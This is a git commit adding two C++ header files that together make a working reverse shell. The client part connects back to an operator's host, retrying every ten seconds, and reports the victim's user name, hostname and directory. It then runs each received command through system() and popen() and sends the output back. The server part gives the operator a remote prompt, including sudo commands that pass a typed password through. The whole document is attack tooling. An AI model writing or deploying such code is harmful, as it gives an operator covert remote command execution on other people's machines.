90a38b451a0220a5facb08cef8c8b0e69ebcfdc4
Amir <amircpro@gmail.com>
2020-05-04 20:26:01 +0100

    Add files via upload

---
+++ shmain.hpp
@@ -0,0 +1,207 @@
+#ifndef MAINSH
+#define MAINSH
+// reverse shell header file using IPV4 
+// binds socket and listens for incoming connection
+
+#include <iostream>
+#include <string.h>
+#include <string>
+#include <thread>
+#include <sys/time.h>
+#include <cstring>
+#include <vector>
+#include <ctime>
+
+//NETWORKING
+#include <unistd.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <limits.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+
+struct mainsh{
+    std::vector<std::string> logs; // stores all the previous commands and exact time
+
+    char client_name[30];
+    char client_hostname[30];
+    char dir[30];
+
+    int bytes_red = 0;
+    int bytes_written = 0;
+
+    int* serverptr;
+
+    int global_socket;
+
+    void tempsleep(){
+        std::chrono::seconds duration(10);
+        std::this_thread::sleep_for(duration);
+    }
+
+    void view_logs(){
+        for(unsigned int p = 0; p < logs.size(); p++){
+            std::cout << logs[p] << std::endl;
+        }
+    }
+
+    void disconnect(int* socketptr){
+        char disconnect[strlen("disconnect")+1] = "disconnect";
+
+        bytes_written += send(*(socketptr), (char*)&disconnect, strlen(disconnect), 0);
+        close(*(socketptr));
+        close(*(serverptr));
+
+        std::cout << "[+] Bytes written: " << bytes_written << std::endl;
+        std::cout << "[+] Bytes red: " << bytes_red << std::endl;
+
+        std::cout << "";
+        exit(1);
+    }
+
+    void send_bytes(std::string buffer){
+        char temp[buffer.length()+1];
+        strcpy(temp, buffer.c_str());
+        // current date/time based on current system
+        time_t now = time(0);
+   
+        // convert now to string form
+        char* dt = ctime(&now);
+        bytes_written += send(global_socket, (char*)&temp, strlen(temp), 0);
+        std::string log = "["+std::string(dt).substr(0, strlen(dt)-1)+"] "+temp;
+        logs.push_back(log);
+    }
+
+    // creates socket and return pointer
+    int* create_socket(unsigned int PORT){
+        
+        char hostname[HOST_NAME_MAX];
+        gethostname(hostname, HOST_NAME_MAX);
+
+        sockaddr_in serv_addr;
+        bzero((char*)&serv_addr, sizeof(serv_addr));
+        serv_addr.sin_family = AF_INET; // IPV4
+        serv_addr.sin_addr.s_addr = htonl(INADDR_ANY); // socket accepts connections to all the IPs of the machine
+        serv_addr.sin_port = htons(PORT); 
+
+        int server_sd = socket(AF_INET, SOCK_STREAM, 0);
+        serverptr = &server_sd;
+        if(server_sd < 0){
+            fprintf(stderr, "[-] failed to open socket: %s\n", strerror(errno));
+            tempsleep();
+        }
+
+        int bind_socket = bind(server_sd, (struct sockaddr*) &serv_addr, sizeof(serv_addr)); //binding socket
+        if(bind_socket < 0){
+            fprintf(stderr, "[-] failed to bind socket: %s\n", strerror(errno));
+            tempsleep();
+        }
+        
+        std::cout << "[+] binding socket as " << hostname << " on port " << PORT << std::endl;
+        listen(server_sd, 5); //second argument is backlog queue
+
+        sockaddr_in new_sock_addr;
+        socklen_t new_sock_addr_size = sizeof(new_sock_addr);
+
+        int new_server_sd = accept(server_sd, (sockaddr *)&new_sock_addr, &new_sock_addr_size);
+        int* ptr_serversd = &new_server_sd;
+        global_socket = new_server_sd;
+        if(new_server_sd < 0){
+            fprintf(stderr, "[-] failed to accept request from client: %s\n", strerror(errno));
+            tempsleep();
+        }
+        std::cout << "[?] socket created at " << ptr_serversd << std::endl;
+        struct timeval start1, end1;
+        gettimeofday(&start1, NULL);
+
+        memset(client_name, '\0', 30);
+        memset(client_hostname, '\0', 30);
+
+        /*
+        std::string str_chostname = std::string(client_hostname).substr(0, strlen(client_hostname)-1);
+        std::string str_cname = std::string(client_name).substr(0, strlen(client_name)-1);
+        */
+
+        bytes_red += recv(new_server_sd, (char*)&client_name, sizeof(client_name), 0); // account
+        bytes_red += recv(new_server_sd, (char*)&client_hostname, sizeof(client_hostname), 0); // hostname
+        bytes_red += recv(new_server_sd, (char*)&dir, sizeof(dir), 0); // directory
+
+        std::cout << "[+] received connection from " <<  std::string(client_hostname).substr(0, strlen(client_hostname)-1) << std::endl;
+        
+        struct hostent *getipv4; //gethostbyname returns a pointer of type hostent
+        getipv4 = gethostbyname((std::string(client_hostname).substr(0, strlen(client_hostname)-1)).c_str() );
+        printf("[?] client addr: %s\n", inet_ntoa(*(struct in_addr*)getipv4->h_addr));
+
+        return ptr_serversd;
+    }
+
+    void createsh(int* socketsd){
+        char buffer[1500];
+
+        std::string cmd;
+        std::string str_dir = std::string(dir).substr(0, strlen(dir)-1);
+        std::string str_name = std::string(client_name).substr(0, strlen(client_name)-1);
+        std::string str_hostname = std::string(client_hostname).substr(0, strlen(client_hostname)-1);
+        // do something about write-protected directory (IMPORTANT)
+
+        while(true){
+            std::cout << str_name << "@" << str_hostname << ":" << str_dir << "$ ";
+            std::getline(std::cin, cmd);
+
+            std::string arg = cmd.substr(0, cmd.find(" "));
+
+            if(cmd == "disconnect"){ disconnect(socketsd);} // close connection
+            else if(cmd == "logs"){view_logs();}
+            else if(cmd == "clear" || cmd == "cls"){system("clear");}
+            else if(cmd.length() == 0){continue;}
+
+            else if(arg == "sudo"){
+                std::string su_cmd = cmd.substr(5, cmd.length()); // super user command
+                std::string pw;
+                
+                std::cout << "[sudo] password for " << str_name << ": ";
+                std::getline(std::cin, pw);
+                memset(&buffer, 0x00, sizeof(buffer));
+                
+                std::string sudo_command = ("echo ") + pw + (" | sudo -S -k ") +  cmd;
+                send_bytes(sudo_command);
+
+                bytes_red += recv(global_socket, (char*)&buffer, sizeof(buffer), 0);
+                std::cout << buffer << std::endl;
+
+            }
+
+            else if(arg == "cd"){
+                std::string next_dir = cmd.substr(3, cmd.length());
+                send_bytes("dir " + next_dir);
+
+                bytes_red += recv(global_socket, (char*)&buffer, sizeof(buffer), 0);
+                std::cout << std::string(buffer).substr(0, strlen(buffer)-1) << std::endl;
+                std::string err = "dir: cannot access '"+next_dir+"': No such file or directory";
+
+                if(std::string(buffer).substr(0, strlen(buffer)-1) != err){
+                    str_dir = next_dir;
+                }
+                memset(&buffer, 0x00, sizeof(buffer));
+            }
+
+            else{
+                std::string ncmd = ("cd " + str_dir + " && " + cmd);
+                send_bytes(ncmd);
+                
+                bytes_red += recv(global_socket, (char*)&buffer, sizeof(buffer), 0);
+                std::cout << std::string(buffer).substr(0, strlen(buffer)-1) << std::endl;
+                memset(&buffer, 0x00, sizeof(buffer));
+            }
+        }
+    
+        
+    }
+
+
+
+};
+
+
+#endif
---
+++ shsecond.hpp
@@ -0,0 +1,133 @@
+#ifndef SECONDSH
+#define SECONDSH
+// reverse shell header file using IPV4 
+// connects to shmain socket
+
+#include <iostream>
+#include <string.h>
+#include <string>
+#include <sys/time.h>
+#include <thread>
+
+//NETWORKING
+#include <unistd.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <limits.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+
+struct secondsh{
+    int bytes_red = 0;
+    int bytes_written = 0;
+    int global_socket;
+
+    std::string system_output(std::string cmd) {
+        std::string data;
+        FILE * stream;
+        const int max_buffer = 256;
+        char buffer[max_buffer];
+        cmd.append(" 2>&1");
+
+        stream = popen(cmd.c_str(), "r");
+        if (stream){
+        while (!feof(stream)){
+            if(fgets(buffer, max_buffer, stream) != NULL){ data.append(buffer);}
+        }
+        pclose(stream);
+            
+        }
+        return data;
+ 
+    }
+
+    void tempsleep(){
+        std::chrono::seconds duration(10);
+        std::this_thread::sleep_for(duration);
+    }
+
+    void send_bytes(int* socketptr, std::string buffer){
+        char temp[buffer.length()+1];
+        strcpy(temp, buffer.c_str());
+
+        bytes_written += send(*(socketptr), (char*)&temp, strlen(temp), 0);
+    }
+
+    int* connect_socket(unsigned int PORT, const std::string hostname){
+        char buffer[1500];
+
+        struct hostent* host = gethostbyname(hostname.c_str()); 
+        sockaddr_in send_sock_addr;   
+        bzero((char*)&send_sock_addr, sizeof(send_sock_addr)); 
+        send_sock_addr.sin_family = AF_INET; //IPV4
+        send_sock_addr.sin_addr.s_addr = inet_addr(inet_ntoa(*(struct in_addr*)*host->h_addr_list)); // inet_ntoa converts host address in network bytes
+        send_sock_addr.sin_port = htons(PORT); // makes sure that numbers are stored in memory in network byte order
+
+        int client_sd = socket(AF_INET, SOCK_STREAM, 0);
+        int* ptr_clientsd = &client_sd;
+        global_socket = client_sd;
+        //try to connect...
+        int bind_status = connect(client_sd, (sockaddr*) &send_sock_addr, sizeof(send_sock_addr));
+        if(bind_status < 0){
+            tempsleep();
+            connect_socket(PORT, hostname);
+        }
+
+        struct timeval start1, end1;
+        gettimeofday(&start1, NULL);
+
+        std::string whoami = system_output("whoami");
+        memset(&buffer, 0x00, sizeof(buffer)); //clear the buffer
+        strcpy(buffer, whoami.c_str());
+        bytes_written += send(client_sd, (char*)&buffer, strlen(buffer), 0);
+
+        std::string chostname = system_output("hostname");
+        memset(&buffer, 0x00, sizeof(buffer)); //clear the buffer
+        strcpy(buffer, chostname.c_str());
+        bytes_written += send(client_sd, (char*)&buffer, strlen(buffer), 0);
+
+        std::string current_dir = system_output("echo $PWD");
+        memset(&buffer, 0x00, sizeof(buffer));
+        strcpy(buffer, current_dir.c_str());
+        bytes_written += send(client_sd, (char*)&buffer, strlen(buffer), 0); //sending current_dir
+
+        return ptr_clientsd;
+
+    }
+
+    void connectsh(int* socket){
+        char buffer[1500];
+        
+        while(true){
+            memset(&buffer, 0x00, sizeof(buffer));
+            int read = recv(global_socket, (char*)&buffer, sizeof(buffer), 0); // read command
+            bytes_red += read;
+
+            std::string s_buffer = std::string(buffer);
+            std::string token = s_buffer.substr(0, s_buffer.find(" "));
+            
+
+            if(read < 0){
+                printf("recv error: %s\n", strerror(errno));
+            }
+
+            else if(!strcmp(buffer, "disconnect")){
+                close(global_socket);
+                exit(1);
+            }
+            
+            system(buffer);
+            std::string cmd_out = system_output(std::string(buffer));
+            //std::cout << buffer << std::endl;
+            strcpy(buffer, cmd_out.c_str());
+            bytes_written += send(global_socket, (char*)&buffer, strlen(buffer)+1, 0);
+     
+        }
+
+
+    }
+
+};
+
+#endif
